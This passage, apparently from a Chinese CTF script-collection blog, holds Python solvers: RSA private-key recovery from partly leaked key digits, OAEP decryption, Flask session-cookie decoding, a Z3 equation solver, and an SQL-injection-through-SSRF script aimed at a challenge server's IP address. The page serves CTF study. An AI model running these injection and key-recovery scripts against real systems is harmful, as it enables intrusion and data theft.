6: 4:a :ce:d :2 : 1:</span></span><br><span class="line"><span class="string">      :  :17:6 :  : c: b:  : f:  :3 : 5:6 :3 :0e:</span></span><br><span class="line"><span class="string">      : 7:c :3e: 2: 9: 7: 6: f: e: f: 9:  :f3: 9:</span></span><br><span class="line"><span class="string">    a :c1:6 :  : 1:9 :  :43:  : f: 5:  :0 :27: 4:</span></span><br><span class="line"><span class="string">    4 :a :  :e9:  : 8: 4:3 :8a: 6:16:d5:c : e: e:</span></span><br><span class="line"><span class="string">      :d : c:b :a8:  : 7:  : 9:  :7 :7d:  :  :  :</span></span><br><span class="line"><span class="string">      :  :  :4 :2 :  : 3: 3: 6:  :  :  :7b:0 :  :</span></span><br><span class="line"><span class="string">     e:  :0 :  :a :  : 5:  :  :  : 5:1 :82:c :0d:</span></span><br><span class="line"><span class="string">    4 :2 :fd:36: 5:50:0 :  :  :d : f: 6:  :  :e :</span></span><br><span class="line"><span class="string">    0 :  :  :ce:  :9e:8 :  :0 :d :07:b3:  :  :  :</span></span><br><span class="line"><span class="string">    0 :e4:  :  :68:b :c :  : c:5 :  :  :3 : 7: 2:</span></span><br><span class="line"><span class="string">     c:e0:  :5 :  :  :b4:  :ef: 7:  :1 :e : 0:f :</span></span><br><span class="line"><span class="string">      :6 :  :  :  :e0:c :3 :  :  : 3:  : d:  :  :</span></span><br><span class="line"><span class="string">     3: 3: c: a:  :b : a:71: 3: 0:a :  :4 :5d:  :</span></span><br><span class="line"><span class="string">    0 :4 """</span>)</span><br><span class="line"></span><br><span class="line">_, dpmask_msk, dpmask_val = msk(<span class="string">"""  : 3:2a:  : d:  :  :  :  :0 :1 : f:  :  : 6:</span></span><br><span class="line"><span class="string">    1 :2 :1b:07: a:e :b :c5:58:7 :  :e8: 7: 1: c:</span></span><br><span class="line"><span class="string">      : 1:b :a0: 4:0f:5 :67:  :3 :7 :6 :f9:  : c:</span></span><br><span class="line"><span class="string">      :79: 0:1 :65:  :8 :  :99: d:d :  :2 :9 :0 :</span></span><br><span class="line"><span class="string">     e:  :0 :  :  :  : d:  :d :7 :6 :a9: a:8b: b:</span></span><br><span class="line"><span class="string">      :  : 7: a:37:  :  :7 :1 :6 :  :c2: 7:6 :b :</span></span><br><span class="line"><span class="string">     e:  :  :  :  :  :  :b :3a:5 :  :  :  :  :  :</span></span><br><span class="line"><span class="string">      :  :  :cd:8 :  : d:  :7 : 3:  : f:e : c:  :</span></span><br><span class="line"><span class="string">      : a:  :c : f:c : 7:b :5 :  :  :2 :8 :8 :6 :</span></span><br><span class="line"><span class="string">    0a: a:  :  :3 :db:  : 4:00:  : d:  :b : 5:  :</span></span><br><span class="line"><span class="string">    20: 2: 5:  :82:  : 0: 6:  :8a:  :7 :  : 8:  :</span></span><br><span class="line"><span class="string">     4: 1:  :  :  : 8:46:  :  :  :  :  : 0:f :c8:</span></span><br><span class="line"><span class="string">    2 :  : c:7 :  : 1:  :  :2 : 0: 5:  :  : 1:9b:</span></span><br><span class="line"><span class="string">     6:9 : 0:74:  :c :  :e :  :  :cb:b :3 :3 :  :</span></span><br><span class="line"><span class="string">     2:  :  :47:  :2 : 0:5 :  :  : d: 6:83:  :  :</span></span><br><span class="line"><span class="string">      :c7:  :  :0b:  :  : c:  :3 :8 :  :9 :4 : 7:</span></span><br><span class="line"><span class="string">    5 :c0:fe:  :f9: 1:  :0 : e: 8:02:  : f:  :c :</span></span><br><span class="line"><span class="string">    55:61"""</span>)</span><br><span class="line"></span><br><span class="line">_, dqmask_msk, dqmask_val = msk(<span class="string">"""  :0b:7 :4 :0 : 0:6 : 7:7e:  : 5:  : 7:  : a:</span></span><br><span class="line"><span class="string">    a :d : 0: 6: 4:86:  :  :8 :  :  :  :  :e :8f:</span></span><br><span class="line"><span class="string">     9:  :  :  : 1:  :2 :  : 7: b:1 :5 : f:  :8 :</span></span><br><span class="line"><span class="string">      :d :21:  :e : d:  :c9:e : b:  :  :1 :  :  :</span></span><br><span class="line"><span class="string">      :d :a2:b7:  :  :  :f3:  :42:  :e : c:  :f :</span></span><br><span class="line"><span class="string">      : 0:f :7 : 4: 5:34:  :4 : c:  :  :8 :d : 8:</span></span><br><span class="line"><span class="string">    5 :af: 3:1d: 5:4 :  :2 :  :6 :c : 6:a :1 :5 :</span></span><br><span class="line"><span class="string">     a:9 :  :d :  :  :0a:a1:  :f :7 :9 :b :  :  :</span></span><br><span class="line"><span class="string">     f:2 :27: f:  :0 :f6:4d:  :  :  :  :  :5 :  :</span></span><br><span class="line"><span class="string">     4:08:  : 5:  : 8: 5:  :  :  :18: 4: 8:57: 2:</span></span><br><span class="line"><span class="string">     f: a:  :  :a8: f: c:f : e: 1:9 :c : 4:9 :  :</span></span><br><span class="line"><span class="string">      :  :  :  :  : 1:  :2 :  :d1:  : 6:e : d:  :</span></span><br><span class="line"><span class="string">      : f:04:2 :8d:  : 3:  :  :b : 8:  :d6:  : 2:</span></span><br><span class="line"><span class="string">      :  :  :6 :  : f:  :  : 0:6 :  :51:  :48:19:</span></span><br><span class="line"><span class="string">      :  :  :69:4 : c:  :c :  : f:  :f4:d :  : f:</span></span><br><span class="line"><span class="string">     d:0 :0d:b :3 : 3:2 :  :  :6 : b:5 :2 :  : c:</span></span><br><span class="line"><span class="string">     1:5a: f:f :  :  :7e:3e:  :d :f :0 : d: c: 6:</span></span><br><span class="line"><span class="string">     1"""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(K, Kp, Kq, check_level, break_step)</span>:</span></span><br><span class="line">    max_step = <span class="number">0</span></span><br><span class="line">    cands = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, break_step + <span class="number">1</span>):</span><br><span class="line">        <span class="comment">#print " ", step, "( max =", max_step, ")"</span></span><br><span class="line">        max_step = max(step, max_step)</span><br><span class="line"></span><br><span class="line">        mod = <span class="number">1</span> &lt;&lt; (<span class="number">4</span> * step)</span><br><span class="line">        mask = mod - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        cands_next = []</span><br><span class="line">        <span class="keyword">for</span> p, new_digit <span class="keyword">in</span> product(cands, p_ranges[-step]):</span><br><span class="line">            pval = (new_digit &lt;&lt; ((step - <span class="number">1</span>) * <span class="number">4</span>)) | p</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">1</span>:</span><br><span class="line">                qval = solve_linear(pval, N &amp; mask, mod)</span><br><span class="line">                <span class="keyword">if</span> qval <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(qval, mask, qmask_msk, qmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">2</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + K * (N - pval - qval + <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dmask_msk, dmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">3</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kp * (pval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dpmask_msk, dpmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">4</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kq * (qval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dqmask_msk, dqmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> pval * qval == N:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"pwned"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"p ="</span>, pval</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"q ="</span>, qval</span><br><span class="line">                    p = pval</span><br><span class="line">                    q = qval</span><br><span class="line">                    d = invmod(E, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                    coef = invmod(p, q)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">                    <span class="keyword">print</span> RSA.construct(map(long, (N, E, d, p, q, coef))).exportKey()</span><br><span class="line">                    quit()</span><br><span class="line"></span><br><span class="line">            cands_next.append(pval)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cands_next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cands = cands_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_val</span><span class="params">(val, mask, mask_msk, mask_val)</span>:</span></span><br><span class="line">    test_mask = mask_msk &amp; mask</span><br><span class="line">    test_val = mask_val &amp; mask</span><br><span class="line">    <span class="keyword">return</span> val &amp; test_mask == test_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># K = 4695</span></span><br><span class="line"><span class="comment"># Kp = 15700</span></span><br><span class="line"><span class="comment"># Kq = 5155</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> K <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> K % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, K</span><br><span class="line">    <span class="keyword">if</span> search(K, <span class="number">0</span>, <span class="number">0</span>, check_level=<span class="number">2</span>, break_step=<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"K ="</span>, K</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kp <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kp % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kp</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, <span class="number">0</span>, check_level=<span class="number">3</span>, break_step=<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kp ="</span>, Kp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kq <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kq % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kq</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, Kq, check_level=<span class="number">4</span>, break_step=<span class="number">9999</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="最优非对称加密填充"><a href="#最优非对称加密填充" class="headerlink" title="最优非对称加密填充"></a>最优非对称加密填充</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最优非对称加密填充</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/private.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private = RSA.importKey(f)</span><br><span class="line">    oaep = PKCS1_OAEP.new(private)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./tmp/flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="session解密脚本"><a href="#session解密脚本" class="headerlink" title="session解密脚本"></a>session解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="sql注入get多参数爆破脚本"><a href="#sql注入get多参数爆破脚本" class="headerlink" title="sql注入get多参数爆破脚本"></a>sql注入get多参数爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://111.198.29.45:57232/download.php'</span></span><br><span class="line"><span class="comment"># subquery = "database()"</span></span><br><span class="line"><span class="comment"># ssrfw</span></span><br><span class="line"><span class="comment"># subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"</span></span><br><span class="line"><span class="comment"># cetcYssrf</span></span><br><span class="line"><span class="comment"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"</span></span><br><span class="line"><span class="comment"># secretname -&gt; flag</span></span><br><span class="line"><span class="comment"># subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"</span></span><br><span class="line"><span class="comment"># value -&gt; flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;</span></span><br><span class="line">subquery = <span class="string">"select value from cetcYssrf LIMIT 1"</span></span><br><span class="line">id = random.randint(<span class="number">1</span>, <span class="number">10000000</span>)</span><br><span class="line">d = (<span class="string">'http://127.0.0.1/secret/secret_debug.php?'</span> +</span><br><span class="line">        urllib.parse.urlencode(&#123;</span><br><span class="line">            <span class="string">"s"</span>: <span class="string">"3"</span>,</span><br><span class="line">            <span class="string">"txtfirst_name"</span>: <span class="string">"L','1',("</span>+subquery+<span class="string">"),'1'/*"</span>,</span><br><span class="line">            <span class="string">"txtmiddle_name"</span>: <span class="string">"m"</span>,</span><br><span class="line">            <span class="string">"txtLast_name"</span>: <span class="string">"y"</span>,</span><br><span class="line">            <span class="string">"txtname_suffix"</span>: <span class="string">"Esq."</span>,</span><br><span class="line">            <span class="string">"txtdob"</span>: <span class="string">"*/,'12/19/2019"</span>,</span><br><span class="line">            <span class="string">"txtdl_nmbr"</span>: id,</span><br><span class="line">            <span class="string">"txtRetypeDL"</span>: id</span><br><span class="line">            &#125;) + <span class="string">"&amp;"</span>)</span><br><span class="line">r = requests.get(url, params=&#123;<span class="string">"dl"</span>: d&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Z3解方程脚本"><a href="#Z3解方程脚本" class="headerlink" title="Z3解方程脚本"></a>Z3解方程脚本</h2><p>by巴伐利亚师傅<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v0=Int(<span class="string">'v0'</span>)</span><br><span class="line">v1=Int(<span class="string">'v1'</span>)</span><br><span class="line">v2=Int(<span class="string">'v2'</span>)</span><br><span class="line">v3=Int(<span class="string">'v3'</span>)</span><br><span class="line">v4=Int(<span class="string">'v4'</span>)</span><br><span class="line">v5=Int(<span class="string">'v5'</span>)</span><br><span class="line">v6=Int(<span class="string">'v6'</span>)</span><br><span class="line">v7=Int(<span class="string">'v7'</span>)</span><br><span class="line">v8=Int(<span class="string">'v8'</span>)</span><br><span class="line">v9=Int(<span class="string">'v9'</span>)</span><br><span class="line">v10=Int(<span class="string">'v10'</span>)</span><br><span class="line">v11=Int(<span class="string">'v11'</span>)</span><br><span class="line">v12=Int(<span class="string">'v12'</span>)</span><br><span class="line">v13=Int(<span class="string">'v13'</span>)</span><br><span class="line">v14=Int(<span class="string">'v14'</span>)</span><br><span class="line">v15=Int(<span class="string">'v15'</span>)</span><br><span class="line">v16=Int(<span class="string">'v16'</span>)</span><br><span class="line">v17=Int(<span class="string">'v17'</span>)</span><br><span class="line">v18=Int(<span class="string">'v18'</span>)</span><br><span class="line">v19=Int(<span class="string">'v19'</span>)</span><br><span class="line">v20=Int(<span class="string">'v20'</span>)</span><br><span class="line">v21=Int(<span class="string">'v21'</span>)</span><br><span class="line">v22=Int(<span class="string">'v22'</span>)</span><br><span class="line">v23=Int(<span class="string">'v23'</span>)</span><br><span class="line">v24=Int(<span class="string">'v24'</span>)</span><br><span class="line">v25=Int(<span class="string">'v25'</span>)</span><br><span class="line">v26=Int(<span class="string">'v26'</span>)</span><br><span class="line">v27=Int(<span class="string">'v27'</span>)</span><br><span class="line">v28=Int(<span class="string">'v28'</span>)</span><br><span class="line">v29=Int(<span class="string">'v29'</span>)</span><br><span class="line">v30=Int(<span class="string">'v30'</span>)</span><br><span class="line">v31=Int(<span class="string">'v31'</span>)</span><br><span class="line">v32=Int(<span class="string">'v32'</span>)</span><br><span class="line">v33=Int(<span class="string">'v33'</span>)</span><br><span class="line">v34=Int(<span class="string">'v34'</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">281</span>*v0+<span class="number">1020</span>*v1+<span class="number">980</span>*v2+<span class="number">902</span>*v3+<span class="number">338</span>*v4+<span class="number">960</span>*v5+<span class="number">1001</span>*v6+<span class="number">1017</span>*v7+<span class="number">963</span>*v8+<span class="number">442</span>*v9+<span class="number">536</span>*v10+<span class="number">1022</span>*v11+<span class="number">212</span>*v12+<span class="number">186</span>*v13+<span class="number">657</span>*v14+<span class="number">886</span>*v15+<span class="number">243</span>*v16+<span class="number">802</span>*v17+<span class="number">751</span>*v18+<span class="number">742</span>*v19+<span class="number">712</span>*v20+<span class="number">316</span>*v21+<span class="number">256</span>*v22+<span class="number">928</span>*v23+<span class="number">1011</span>*v24+<span class="number">707</span>*v25+<span class="number">415</span>*v26+<span class="number">244</span>*v27+<span class="number">962</span>*v28+<span class="number">796</span>*v29+<span class="number">473</span>*v30+<span class="number">96</span>*v31+<span class="number">598</span>*v32+<span class="number">948</span>*v33+<span class="number">416</span>*v34==<span class="number">12220997</span>)</span><br><span class="line">s.add(<span class="number">442</span>*v0+<span class="number">272</span>*v1+<span class="number">973</span>*v2+<span class="number">311</span>*v3+<span class="number">886</span>*v4+<span class="number">465</span>*v5+<span class="number">91</span>*v6+<span class="number">579</span>*v7+<span class="number">88</span>*v8+<span class="number">1000</span>*v9+<span class="number">20</span>*v10+<span class="number">914</span>*v11+<span class="number">991</span>*v12+<span class="number">953</span>*v13+<span class="number">47</span>*v14+<span class="number">117</span>*v15+<span class="number">216</span>*v16+<span class="number">693</span>*v17+<span class="number">346</span>*v18+<span class="number">374</span>*v19+<span class="number">175</span>*v20+<span class="number">46</span>*v21+<span class="number">221</span>*v22+<span class="number">485</span>*v23+<span class="number">1022</span>*v24+<span class="number">28</span>*v25+<span class="number">380</span>*v26+<span class="number">997</span>*v27+<span class="number">411</span>*v28+<span class="number">421</span>*v29+<span class="number">361</span>*v30+<span class="number">81</span>*v31+<span class="number">145</span>*v32+<span class="number">941</span>*v33+<span class="number">325</span>*v34==<span class="number">9213917</span>)</span><br><span class="line">s.add(<span class="number">175</span>*v0+<span class="number">989</span>*v1+<span class="number">486</span>*v2+<span class="number">717</span>*v3+<span class="number">146</span>*v4+<span class="number">418</span>*v5+<span class="number">446</span>*v6+<span class="number">598</span>*v7+<span class="number">526</span>*v8+<span class="number">363</span>*v9+<span class="number">18</span>*v10+<span class="number">332</span>*v11+<span class="number">103</span>*v12+<span class="number">834</span>*v13+<span class="number">443</span>*v14+<span class="number">407</span>*v15+<span class="number">870</span>*v16+<span class="number">999</span>*v17+<span class="number">278</span>*v18+<span class="number">624</span>*v19+<span class="number">863</span>*v20+<span class="number">486</span>*v21+<span class="number">413</span>*v22+<span class="number">825</span>*v23+<span class="number">347</span>*v24+<span class="number">543</span>*v25+<span class="number">362</span>*v26+<span class="number">645</span>*v27+<span class="number">505</span>*v28+<span class="number">738</span>*v29+<span class="number">612</span>*v30+<span class="number">268</span>*v31+<span class="number">94</span>*v32+<span class="number">646</span>*v33+<span class="number">32</span>*v34==<span class="number">8907244</span>)</span><br><span class="line">s.add(<span class="number">987</span>*v0+<span class="number">454</span>*v1+<span class="number">828</span>*v2+<span class="number">508</span>*v3+<span class="number">993</span>*v4+<span class="number">762</span>*v5+<span class="number">497</span>*v6+<span class="number">83</span>*v7+<span class="number">591</span>*v8+<span class="number">533</span>*v9+<span class="number">955</span>*v10+<span class="number">265</span>*v11+<span class="number">568</span>*v12+<span class="number">117</span>*v13+<span class="number">818</span>*v14+<span class="number">133</span>*v15+<span class="number">1</span>*v16+<span class="number">305</span>*v17+<span class="number">319</span>*v18+<span class="number">257</span>*v19+<span class="number">273</span>*v20+<span class="number">956</span>*v21+<span class="number">260</span>*v22+<span class="number">349</span>*v23+<span class="number">719</span>*v24+<span class="number">416</span>*v25+<span class="number">956</span>*v26+<span class="number">388</span>*v27+<span class="number">795</span>*v28+<span class="number">43</span>*v29+<span class="number">378</span>*v30+<span class="number">379</span>*v31+<span class="number">295</span>*v32+<span class="number">603</span>*v33+<span class="number">722</span>*v34==<span class="number">10103617</span>)</span><br><span class="line">s.add(<span class="number">851</span>*v0+<span class="number">884</span>*v1+<span class="number">425</span>*v2+<span class="number">538</span>*v3+<span class="number">627</span>*v4+<span class="number">548</span>*v5+<span class="number">714</span>*v6+<span class="number">129</span>*v7+<span class="number">46</span>*v8+<span class="number">445</span>*v9+<span class="number">444</span>*v10+<span class="number">1002</span>*v11+<span class="number">170</span>*v12+<span class="number">162</span>*v13+<span class="number">476</span>*v14+<span class="number">849</span>*v15+<span class="number">136</span>*v16+<span class="number">929</span>*v17+<span class="number">392</span>*v18+<span class="number">341</span>*v19+<span class="number">747</span>*v20+<span class="number">385</span>*v21+<span class="number">318</span>*v22+<span class="number">503</span>*v23+<span class="number">248</span>*v24+<span class="number">308</span>*v25+<span class="number">838</span>*v26+<span class="number">567</span>*v27+<span class="number">565</span>*v28+<span class="number">878</span>*v29+<span class="number">831</span>*v30+<span class="number">561</span>*v31+<span class="number">222</span>*v32+<span class="number">363</span>*v33+<span class="number">74</span>*v34==<span class="number">9423443</span>)</span><br><span class="line">s.add(<span class="number">227</span>*v0+<span class="number">218</span>*v1+<span class="number">313</span>*v2+<span class="number">37</span>*v3+<span class="number">247</span>*v4+<span class="number">952</span>*v5+<span class="number">499</span>*v6+<span class="number">908</span>*v7+<span class="number">50</span>*v8+<span class="number">344</span>*v9+<span class="number">182</span>*v10+<span class="number">980</span>*v11+<span class="number">568</span>*v12+<span class="number">648</span>*v13+<span class="number">944</span>*v14+<span class="number">538</span>*v15+<span class="number">886</span>*v16+<span class="number">280</span>*v17+<span class="number">18</span>*v18+<span class="number">207</span>*v19+<span class="number">21</span>*v20+<span class="number">532</span>*v21+<span class="number">38</span>*v22+<span class="number">1007</span>*v23+<span class="number">890</span>*v24+<span class="number">335</span>*v25+<span class="number">748</span>*v26+<span class="number">88</span>*v27+<span class="number">478</span>*v28+<span class="number">539</span>*v29+<span class="number">966</span>*v30+<span 